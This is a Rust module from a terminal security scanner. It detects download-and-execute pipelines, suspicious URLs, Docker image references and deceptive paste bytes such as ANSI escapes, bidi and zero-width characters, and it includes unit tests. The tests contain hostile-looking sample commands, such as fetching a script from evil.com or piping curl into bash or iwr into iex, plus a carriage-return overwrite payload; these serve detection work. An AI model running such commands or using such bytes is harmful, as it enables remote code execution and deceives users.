use once_cell::sync::Lazy;
use regex::Regex;

use crate::parse::{self, UrlLike};
use crate::tokenize::{self, Segment, ShellType};

/// Context for Tier 1 scanning.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum ScanContext {
    /// Exec-time: command about to be executed (check subcommand).
    Exec,
    /// Paste-time: content being pasted (paste subcommand).
    Paste,
}

// Include generated Tier 1 patterns from build.rs declarative pattern table.
#[allow(dead_code)]
mod tier1_generated {
    include!(concat!(env!("OUT_DIR"), "/tier1_gen.rs"));
}

/// Expose the build-time extractor IDs for test-time cross-referencing.
pub fn extractor_ids() -> &'static [&'static str] {
    tier1_generated::EXTRACTOR_IDS
}

/// Tier 1 exec-time regex — generated from declarative pattern table in build.rs.
static TIER1_EXEC_REGEX: Lazy<Regex> = Lazy::new(|| {
    Regex::new(tier1_generated::TIER1_EXEC_PATTERN).expect("tier1 exec regex must compile")
});

/// Tier 1 paste-time regex — exec patterns PLUS paste-only patterns (e.g. non-ASCII).
static TIER1_PASTE_REGEX: Lazy<Regex> = Lazy::new(|| {
    Regex::new(tier1_generated::TIER1_PASTE_PATTERN).expect("tier1 paste regex must compile")
});

/// Standard URL extraction regex for Tier 3.
static URL_REGEX: Lazy<Regex> = Lazy::new(|| {
    Regex::new(
        r#"(?:(?:https?|ftp|ssh|git)://[^\s'"<>]+)|(?:[a-zA-Z0-9._-]+@[a-zA-Z0-9._-]+:[^\s'"<>]+)"#,
    )
    .expect("url regex must compile")
});

/// Control character patterns for paste-time byte scanning.
pub struct ByteScanResult {
    pub has_ansi_escapes: bool,
    pub has_control_chars: bool,
    pub has_bidi_controls: bool,
    pub has_zero_width: bool,
    pub has_invalid_utf8: bool,
    pub details: Vec<ByteFinding>,
}

pub struct ByteFinding {
    pub offset: usize,
    pub byte: u8,
    pub description: String,
}

/// Tier 1: Fast scan for URL-like content. Returns true if full analysis needed.
pub fn tier1_scan(input: &str, context: ScanContext) -> bool {
    match context {
        ScanContext::Exec => TIER1_EXEC_REGEX.is_match(input),
        ScanContext::Paste => TIER1_PASTE_REGEX.is_match(input),
    }
}

/// Scan raw bytes for control characters (paste-time, Tier 1 step 1).
pub fn scan_bytes(input: &[u8]) -> ByteScanResult {
    let mut result = ByteScanResult {
        has_ansi_escapes: false,
        has_control_chars: false,
        has_bidi_controls: false,
        has_zero_width: false,
        has_invalid_utf8: false,
        details: Vec::new(),
    };

    // Check for invalid UTF-8
    if std::str::from_utf8(input).is_err() {
        result.has_invalid_utf8 = true;
    }

    let len = input.len();
    let mut i = 0;
    while i < len {
        let b = input[i];

        // Escape sequences: CSI (\e[), OSC (\e]), APC (\e_), DCS (\eP)
        if b == 0x1b {
            if i + 1 < len {
                let next = input[i + 1];
                if next == b'[' || next == b']' || next == b'_' || next == b'P' {
                    result.has_ansi_escapes = true;
                    result.details.push(ByteFinding {
                        offset: i,
                        byte: b,
                        description: match next {
                            b'[' => "CSI escape sequence",
                            b']' => "OSC escape sequence",
                            b'_' => "APC escape sequence",
                            b'P' => "DCS escape sequence",
                            _ => "escape sequence",
                        }
                        .to_string(),
                    });
                    i += 2;
                    continue;
                }
            } else {
                // Trailing lone ESC
                result.has_ansi_escapes = true;
                result.details.push(ByteFinding {
                    offset: i,
                    byte: b,
                    description: "trailing escape byte".to_string(),
                });
            }
        }

        // Control characters (< 0x20, excluding common whitespace and ESC)
        // For \r: only flag when followed by non-\n (display-overwriting attack).
        // Trailing \r and \r\n (Windows line endings) are benign clipboard artifacts.
        if b == b'\r' {
            let is_attack_cr = i + 1 < len && input[i + 1] != b'\n';
            if is_attack_cr {
                result.has_control_chars = true;
                result.details.push(ByteFinding {
                    offset: i,
                    byte: b,
                    description: format!("control character 0x{b:02x}"),
                });
            }
        } else if b < 0x20 && b != b'\n' && b != b'\t' && b != 0x1b {
            result.has_control_chars = true;
            result.details.push(ByteFinding {
                offset: i,
                byte: b,
                description: format!("control character 0x{b:02x}"),
            });
        }

        // DEL character
        if b == 0x7F {
            result.has_control_chars = true;
            result.details.push(ByteFinding {
                offset: i,
                byte: b,
                description: "control character 0x7f (DEL)".to_string(),
            });
        }

        // Check for UTF-8 multi-byte sequences that are bidi or zero-width
        if b >= 0xc0 {
            // Try to decode UTF-8 character
            let remaining = &input[i..];
            if let Some(ch) = std::str::from_utf8(remaining)
                .ok()
                .or_else(|| std::str::from_utf8(&remaining[..remaining.len().min(4)]).ok())
                .and_then(|s| s.chars().next())
            {
                // Bidi controls
                if is_bidi_control(ch) {
                    result.has_bidi_controls = true;
                    result.details.push(ByteFinding {
                        offset: i,
                        byte: b,
                        description: format!("bidi control U+{:04X}", ch as u32),
                    });
                }
                // Zero-width characters
                if is_zero_width(ch) {
                    result.has_zero_width = true;
                    result.details.push(ByteFinding {
                        offset: i,
                        byte: b,
                        description: format!("zero-width character U+{:04X}", ch as u32),
                    });
                }
                i += ch.len_utf8();
                continue;
            }
        }

        i += 1;
    }

    result
}

/// Check if a character is a bidi control.
fn is_bidi_control(ch: char) -> bool {
    matches!(
        ch,
        '\u{200E}' // LRM
        | '\u{200F}' // RLM
        | '\u{202A}' // LRE
        | '\u{202B}' // RLE
        | '\u{202C}' // PDF
        | '\u{202D}' // LRO
        | '\u{202E}' // RLO
        | '\u{2066}' // LRI
        | '\u{2067}' // RLI
        | '\u{2068}' // FSI
        | '\u{2069}' // PDI
    )
}

/// Check if a character is zero-width.
fn is_zero_width(ch: char) -> bool {
    matches!(
        ch,
        '\u{200B}' // ZWSP
        | '\u{200C}' // ZWNJ
        | '\u{200D}' // ZWJ
        | '\u{FEFF}' // BOM / ZWNBSP
    )
}

/// Tier 3: Extract URL-like patterns from a command string.
/// Uses shell-aware tokenization, then extracts URLs from each segment.
pub fn extract_urls(input: &str, shell: ShellType) -> Vec<ExtractedUrl> {
    let segments = tokenize::tokenize(input, shell);
    let mut results = Vec::new();

    for (seg_idx, segment) in segments.iter().enumerate() {
        // Extract standard URLs from raw text
        for mat in URL_REGEX.find_iter(&segment.raw) {
            let raw = mat.as_str().to_string();
            let url = parse::parse_url(&raw);
            results.push(ExtractedUrl {
                raw,
                parsed: url,
                segment_index: seg_idx,
                in_sink_context: is_sink_context(segment, &segments),
            });
        }

        // Check for schemeless URLs in sink contexts
        // Skip for docker/podman/nerdctl commands since their args are handled as DockerRef
        let is_docker_cmd = segment.command.as_ref().is_some_and(|cmd| {
            let cmd_lower = cmd.to_lowercase();
            matches!(cmd_lower.as_str(), "docker" | "podman" | "nerdctl")
        });
        if is_sink_context(segment, &segments) && !is_docker_cmd {
            for arg in &segment.args {
                let clean = strip_quotes(arg);
                if looks_like_schemeless_host(&clean) && !URL_REGEX.is_match(&clean) {
                    results.push(ExtractedUrl {
                        raw: clean.clone(),
                        parsed: UrlLike::SchemelessHostPath {
                            host: extract_host_from_schemeless(&clean),
                            path: extract_path_from_schemeless(&clean),
                        },
                        segment_index: seg_idx,
                        in_sink_context: true,
                    });
                }
            }
        }

        // Check for Docker refs in docker commands
        if let Some(cmd) = &segment.command {
            let cmd_lower = cmd.to_lowercase();
            if matches!(cmd_lower.as_str(), "docker" | "podman" | "nerdctl") {
                if let Some(docker_subcmd) = segment.args.first() {
                    let subcmd_lower = docker_subcmd.to_lowercase();
                    if subcmd_lower == "build" {
                        // For build, only -t/--tag values are image refs
                        let mut i = 1;
                        while i < segment.args.len() {
                            let arg = strip_quotes(&segment.args[i]);
                            if (arg == "-t" || arg == "--tag") && i + 1 < segment.args.len() {
                                let tag_val = strip_quotes(&segment.args[i + 1]);
                                if !tag_val.is_empty() {
                                    let docker_url = parse::parse_docker_ref(&tag_val);
                                    results.push(ExtractedUrl {
                                        raw: tag_val,
                                        parsed: docker_url,
                                        segment_index: seg_idx,
                                        in_sink_context: true,
                                    });
                                }
                                i += 2;
                            } else if arg.starts_with("-t") && arg.len() > 2 {
                                let tag_val = strip_quotes(&arg[2..]);
                                let docker_url = parse::parse_docker_ref(&tag_val);
                                results.push(ExtractedUrl {
                                    raw: tag_val,
                                    parsed: docker_url,
                                    segment_index: seg_idx,
                                    in_sink_context: true,
                                });
                                i += 1;
                            } else if let Some(val) = arg.strip_prefix("--tag=") {
                                let tag_val = strip_quotes(val);
                                let docker_url = parse::parse_docker_ref(&tag_val);
                                results.push(ExtractedUrl {
                                    raw: tag_val,
                                    parsed: docker_url,
                                    segment_index: seg_idx,
                                    in_sink_context: true,
                                });
                                i += 1;
                            } else {
                                i += 1;
                            }
                        }
                    } else if subcmd_lower == "image" {
                        // docker image pull/push/inspect — actual subcmd is args[1]
                        if let Some(image_subcmd) = segment.args.get(1) {
                            let image_subcmd_lower = image_subcmd.to_lowercase();
                            if matches!(
                                image_subcmd_lower.as_str(),
                                "pull" | "push" | "inspect" | "rm" | "tag"
                            ) {
                                extract_first_docker_image(
                                    &segment.args[2..],
                                    seg_idx,
                                    &mut results,
                                );
                            }
                        }
                    } else if matches!(subcmd_lower.as_str(), "pull" | "run" | "create") {
                        // First non-flag arg is image, then stop
                        extract_first_docker_image(&segment.args[1..], seg_idx, &mut results);
                    }
                }
            }
        }
    }

    results
}

/// An extracted URL with context.
#[derive(Debug, Clone)]
pub struct ExtractedUrl {
    pub raw: String,
    pub parsed: UrlLike,
    pub segment_index: usize,
    pub in_sink_context: bool,
}

/// Common value-taking flags across docker subcommands.
const DOCKER_VALUE_FLAGS: &[&str] = &[
    "--platform",
    "--format",
    "--filter",
    "-f",
    "--label",
    "-l",
    "--name",
    "--hostname",
    "--user",
    "-u",
    "--workdir",
    "-w",
    "--network",
    "--net",
    "--env",
    "-e",
    "--env-file",
    "--publish",
    "-p",
    "--expose",
    "--volume",
    "-v",
    "--mount",
    "--add-host",
    "--device",
    "--entrypoint",
    "--log-driver",
    "--log-opt",
    "--restart",
    "--runtime",
    "--cpus",
    "--cpu-shares",
    "--cpu-quota",
    "--memory",
    "--memory-reservation",
    "--memory-swap",
    "--shm-size",
    "--ulimit",
    "--security-opt",
    "--sysctl",
    "--tmpfs",
    "--gpus",
    "--ipc",
    "--pid",
    "--userns",
    "--cgroupns",
];

/// Short flags that may embed their value inline (e.g., -p8080:80).
const DOCKER_VALUE_PREFIXES: &[&str] = &["-p", "-e", "-v", "-l", "-u", "-w"];

/// Extract the first non-flag argument as a Docker image reference.
fn extract_first_docker_image(args: &[String], seg_idx: usize, results: &mut Vec<ExtractedUrl>) {
    let mut skip_next = false;
    for arg in args {
        if skip_next {
            skip_next = false;
            continue;
        }
        let clean = strip_quotes(arg);
        if clean == "--" {
            break;
        }
        if clean.starts_with("--") && clean.contains('=') {
            continue; // --flag=value, skip
        }
        if clean.starts_with('-') {
            if DOCKER_VALUE_FLAGS.iter().any(|f| clean == *f) {
                skip_next = true;
            }
            if DOCKER_VALUE_PREFIXES
                .iter()
                .any(|p| clean.starts_with(p) && clean.len() > p.len())
            {
                continue;
            }
            continue;
        }
        if !clean.contains("://") && clean != "." && clean != ".." && clean != "-" {
            let docker_url = parse::parse_docker_ref(&clean);
            results.push(ExtractedUrl {
                raw: clean,
                parsed: docker_url,
                segment_index: seg_idx,
                in_sink_context: true,
            });
        }
        break; // Only first non-flag arg is the image
    }
}

/// Check if a segment is in a "sink" context (executing/downloading).
fn is_sink_context(segment: &Segment, _all_segments: &[Segment]) -> bool {
    if let Some(cmd) = &segment.command {
        let cmd_base = cmd.rsplit('/').next().unwrap_or(cmd);
        let cmd_lower = cmd_base.to_lowercase();
        if is_source_command(&cmd_lower) {
            return true;
        }
    }

    // Check if this segment pipes into a sink
    if let Some(sep) = &segment.preceding_separator {
        if sep == "|" || sep == "|&" {
            // This segment receives piped input — check if it's an interpreter
            if let Some(cmd) = &segment.command {
                let cmd_base = cmd.rsplit('/').next().unwrap_or(cmd);
                if is_interpreter(cmd_base) {
                    return true;
                }
            }
        }
    }

    false
}

fn is_source_command(cmd: &str) -> bool {
    matches!(
        cmd,
        "curl"
            | "wget"
            | "fetch"
            | "scp"
            | "rsync"
            | "git"
            | "ssh"
            | "docker"
            | "podman"
            | "nerdctl"
            | "pip"
            | "pip3"
            | "npm"
            | "npx"
            | "yarn"
            | "pnpm"
            | "go"
            | "cargo"
            | "iwr"
            | "irm"
            | "invoke-webrequest"
            | "invoke-restmethod"
    )
}

fn is_interpreter(cmd: &str) -> bool {
    matches!(
        cmd,
        "sh" | "bash"
            | "zsh"
            | "dash"
            | "ksh"
            | "python"
            | "python3"
            | "node"
            | "perl"
            | "ruby"
            | "php"
            | "iex"
            | "invoke-expression"
    )
}

fn strip_quotes(s: &str) -> String {
    let s = s.trim();
    if s.len() >= 2
        && ((s.starts_with('"') && s.ends_with('"')) || (s.starts_with('\'') && s.ends_with('\'')))
    {
        s[1..s.len() - 1].to_string()
    } else {
        s.to_string()
    }
}

fn looks_like_schemeless_host(s: &str) -> bool {
    // Must contain a dot, not start with -, not be a flag
    if s.starts_with('-') || !s.contains('.') {
        return false;
    }
    // First component before / or end should look like a domain
    let host_part = s.split('/').next().unwrap_or(s);
    if !host_part.contains('.') || host_part.contains(' ') {
        return false;
    }
    // Exclude args where the host part looks like a file (e.g., "install.sh")
    // Only check the host part (before first /), not the full string with path
    let file_exts = [
        ".sh", ".py", ".rb", ".js", ".ts", ".go", ".rs", ".c", ".h", ".txt", ".md", ".json",
        ".yaml", ".yml", ".xml", ".html", ".css", ".tar.gz", ".tar.bz2", ".tar.xz", ".tgz", ".zip",
        ".gz", ".bz2", ".rpm", ".deb", ".pkg", ".dmg", ".exe", ".msi", ".dll", ".so", ".log",
        ".conf", ".cfg", ".ini", ".toml",
    ];
    let host_lower = host_part.to_lowercase();
    if file_exts.iter().any(|ext| host_lower.ends_with(ext)) {
        return false;
    }
    // Must have at least 2 labels (e.g., "example.com" not just "file.txt")
    let labels: Vec<&str> = host_part.split('.').collect();
    if labels.len() < 2 {
        return false;
    }
    // Last label (TLD) should be 2-6 alphabetic chars
    let tld = labels.last().unwrap();
    tld.len() >= 2 && tld.len() <= 63 && tld.chars().all(|c| c.is_ascii_alphabetic())
}

fn extract_host_from_schemeless(s: &str) -> String {
    s.split('/').next().unwrap_or(s).to_string()
}

fn extract_path_from_schemeless(s: &str) -> String {
    if let Some(idx) = s.find('/') {
        s[idx..].to_string()
    } else {
        String::new()
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_tier1_exec_matches_url() {
        assert!(tier1_scan("curl https://example.com", ScanContext::Exec));
    }

    #[test]
    fn test_tier1_exec_no_match_simple() {
        assert!(!tier1_scan("ls -la", ScanContext::Exec));
    }

    #[test]
    fn test_tier1_exec_no_match_echo() {
        assert!(!tier1_scan("echo hello world", ScanContext::Exec));
    }

    #[test]
    fn test_tier1_exec_matches_pipe_bash() {
        assert!(tier1_scan("something | bash", ScanContext::Exec));
    }

    #[test]
    fn test_tier1_exec_matches_pipe_sudo_bash() {
        assert!(tier1_scan("something | sudo bash", ScanContext::Exec));
    }

    #[test]
    fn test_tier1_exec_matches_pipe_env_bash() {
        assert!(tier1_scan("something | env bash", ScanContext::Exec));
    }

    #[test]
    fn test_tier1_exec_matches_pipe_bin_bash() {
        assert!(tier1_scan("something | /bin/bash", ScanContext::Exec));
    }

    #[test]
    fn test_tier1_exec_matches_git_scp() {
        assert!(tier1_scan(
            "git clone git@github.com:user/repo",
            ScanContext::Exec
        ));
    }

    #[test]
    fn test_tier1_exec_matches_punycode() {
        assert!(tier1_scan(
            "curl https://xn--example-cua.com",
            ScanContext::Exec
        ));
    }

    #[test]
    fn test_tier1_exec_matches_docker() {
        assert!(tier1_scan("docker pull malicious/image", ScanContext::Exec));
    }

    #[test]
    fn test_tier1_exec_matches_iwr() {
        assert!(tier1_scan(
            "iwr https://evil.com/script.ps1",
            ScanContext::Exec
        ));
    }

    #[test]
    fn test_tier1_exec_matches_curl() {
        assert!(tier1_scan(
            "curl https://example.com/install.sh",
            ScanContext::Exec
        ));
    }

    #[test]
    fn test_tier1_exec_matches_lookalike_tld() {
        assert!(tier1_scan("open file.zip", ScanContext::Exec));
    }

    #[test]
    fn test_tier1_exec_matches_shortener() {
        assert!(tier1_scan("curl bit.ly/abc", ScanContext::Exec));
    }

    #[test]
    fn test_tier1_paste_matches_non_ascii() {
        assert!(tier1_scan("café", ScanContext::Paste));
    }

    #[test]
    fn test_tier1_paste_exec_patterns_also_match() {
        assert!(tier1_scan("curl https://example.com", ScanContext::Paste));
    }

    #[test]
    fn test_tier1_exec_no_non_ascii() {
        // Non-ASCII should NOT trigger exec-time scan
        assert!(!tier1_scan("echo café", ScanContext::Exec));
    }

    #[test]
    fn test_byte_scan_ansi() {
        let input = b"hello \x1b[31mred\x1b[0m world";
        let result = scan_bytes(input);
        assert!(result.has_ansi_escapes);
    }

    #[test]
    fn test_byte_scan_control_chars() {
        let input = b"hello\rworld";
        let result = scan_bytes(input);
        assert!(result.has_control_chars);
    }

    #[test]
    fn test_byte_scan_bidi() {
        let input = "hello\u{202E}dlrow".as_bytes();
        let result = scan_bytes(input);
        assert!(result.has_bidi_controls);
    }

    #[test]
    fn test_byte_scan_zero_width() {
        let input = "hel\u{200B}lo".as_bytes();
        let result = scan_bytes(input);
        assert!(result.has_zero_width);
    }

    #[test]
    fn test_byte_scan_clean() {
        let input = b"hello world\n";
        let result = scan_bytes(input);
        assert!(!result.has_ansi_escapes);
        assert!(!result.has_control_chars);
        assert!(!result.has_bidi_controls);
        assert!(!result.has_zero_width);
    }

    #[test]
    fn test_extract_urls_basic() {
        let urls = extract_urls("curl https://example.com/install.sh", ShellType::Posix);
        assert_eq!(urls.len(), 1);
        assert_eq!(urls[0].raw, "https://example.com/install.sh");
    }

    #[test]
    fn test_extract_urls_pipe() {
        let urls = extract_urls(
            "curl https://example.com/install.sh | bash",
            ShellType::Posix,
        );
        assert!(!urls.is_empty());
        assert!(urls[0].in_sink_context);
    }

    #[test]
    fn test_extract_urls_scp() {
        let urls = extract_urls("git clone git@github.com:user/repo.git", ShellType::Posix);
        assert!(!urls.is_empty());
        assert!(matches!(urls[0].parsed, UrlLike::Scp { .. }));
    }

    #[test]
    fn test_extract_docker_ref() {
        let urls = extract_urls("docker pull nginx", ShellType::Posix);
        let docker_urls: Vec<_> = urls
            .iter()
            .filter(|u| matches!(u.parsed, UrlLike::DockerRef { .. }))
            .collect();
        assert_eq!(docker_urls.len(), 1);
    }

    #[test]
    fn test_extract_powershell_iwr() {
        let urls = extract_urls(
            "iwr https://example.com/script.ps1 | iex",
            ShellType::PowerShell,
        );
        assert!(!urls.is_empty());
    }

    #[test]
    fn test_strip_quotes_single_char() {
        assert_eq!(strip_quotes("\""), "\"");
        assert_eq!(strip_quotes("'"), "'");
    }

    #[test]
    fn test_strip_quotes_empty() {
        assert_eq!(strip_quotes(""), "");
    }

    #[test]
    fn test_scan_bytes_bel_vt_del() {
        // BEL (0x07)
        let input = b"hello\x07world";
        let result = scan_bytes(input);
        assert!(result.has_control_chars);

        // VT (0x0B)
        let input = b"hello\x0Bworld";
        let result = scan_bytes(input);
        assert!(result.has_control_chars);

        // FF (0x0C)
        let input = b"hello\x0Cworld";
        let result = scan_bytes(input);
        assert!(result.has_control_chars);

        // DEL (0x7F)
        let input = b"hello\x7Fworld";
        let result = scan_bytes(input);
        assert!(result.has_control_chars);
    }

    #[test]
    fn test_scan_bytes_osc_apc_dcs() {
        // OSC: \e]
        let input = b"hello\x1b]0;title\x07world";
        let result = scan_bytes(input);
        assert!(result.has_ansi_escapes);

        // APC: \e_
        let input = b"hello\x1b_dataworld";
        let result = scan_bytes(input);
        assert!(result.has_ansi_escapes);

        // DCS: \eP
        let input = b"hello\x1bPdataworld";
        let result = scan_bytes(input);
        assert!(result.has_ansi_escapes);
    }

    #[test]
    fn test_schemeless_long_tld() {
        assert!(looks_like_schemeless_host("example.academy"));
        assert!(looks_like_schemeless_host("example.photography"));
    }

    #[test]
    fn test_segment_index_correct() {
        let urls = extract_urls("curl https://a.com | wget https://b.com", ShellType::Posix);
        // Each URL should have the segment index of the segment it came from
        for url in &urls {
            // segment_index should be 0 or 1, not an incrementing counter
            assert!(url.segment_index <= 1);
        }
    }

    #[test]
    fn test_docker_build_context_not_image() {
        let urls = extract_urls("docker build .", ShellType::Posix);
        let docker_urls: Vec<_> = urls
            .iter()
            .filter(|u| matches!(u.parsed, UrlLike::DockerRef { .. }))
            .collect();
        assert_eq!(
            docker_urls.len(),
            0,
            "build context '.' should not be treated as image"
        );
    }

    #[test]
    fn test_docker_image_subcmd() {
        let urls = extract_urls("docker image pull nginx", ShellType::Posix);
        let docker_urls: Vec<_> = urls
            .iter()
            .filter(|u| matches!(u.parsed, UrlLike::DockerRef { .. }))
            .collect();
        assert_eq!(docker_urls.len(), 1);
    }

    /// Constraint #2: Verify that EXTRACTOR_IDS is non-empty and
    /// that all generated fragment counts are positive.
    /// This is a module boundary enforcement test — ensures no secret
    /// extractors exist outside the declarative pattern table.
    #[test]
    fn test_tier1_module_boundary_enforcement() {
        // Verify extractor IDs are generated
        let ids = tier1_generated::EXTRACTOR_IDS;
        assert!(!ids.is_empty(), "EXTRACTOR_IDS must not be empty");
        // Verify exec and paste fragment counts
        let exec_count = tier1_generated::TIER1_EXEC_FRAGMENT_COUNT;
        let paste_count = tier1_generated::TIER1_PASTE_FRAGMENT_COUNT;
        assert!(exec_count > 0, "Must have exec fragments");
        assert!(
            paste_count >= exec_count,
            "Paste fragments must be superset of exec fragments"
        );
        // Verify the generated patterns are valid regexes
        Regex::new(tier1_generated::TIER1_EXEC_PATTERN)
            .expect("Generated exec pattern must be valid regex");
        Regex::new(tier1_generated::TIER1_PASTE_PATTERN)
            .expect("Generated paste pattern must be valid regex");
    }

    // ─── CR normalization tests ───

    #[test]
    fn test_scan_bytes_trailing_cr_not_flagged() {
        let result = scan_bytes(b"/path\r");
        assert!(
            !result.has_control_chars,
            "trailing \\r should not be flagged"
        );
    }

    #[test]
    fn test_scan_bytes_trailing_crlf_not_flagged() {
        let result = scan_bytes(b"/path\r\n");
        assert!(
            !result.has_control_chars,
            "trailing \\r\\n should not be flagged"
        );
    }

    #[test]
    fn test_scan_bytes_windows_multiline_not_flagged() {
        let result = scan_bytes(b"line1\r\nline2\r\n");
        assert!(
            !result.has_control_chars,
            "Windows \\r\\n line endings should not be flagged"
        );
    }

    #[test]
    fn test_scan_bytes_embedded_cr_still_flagged() {
        let result = scan_bytes(b"safe\rmalicious");
        assert!(
            result.has_control_chars,
            "embedded \\r before non-\\n should be flagged"
        );
    }

    #[test]
    fn test_scan_bytes_mixed_crlf_and_attack_cr() {
        let result = scan_bytes(b"line1\r\nfake\roverwrite\r\n");
        assert!(
            result.has_control_chars,
            "attack \\r mixed with \\r\\n should be flagged"
        );
    }

    #[test]
    fn test_scan_bytes_only_cr() {
        let result = scan_bytes(b"\r");
        assert!(
            !result.has_control_chars,
            "lone trailing \\r should not be flagged"
        );
    }
}
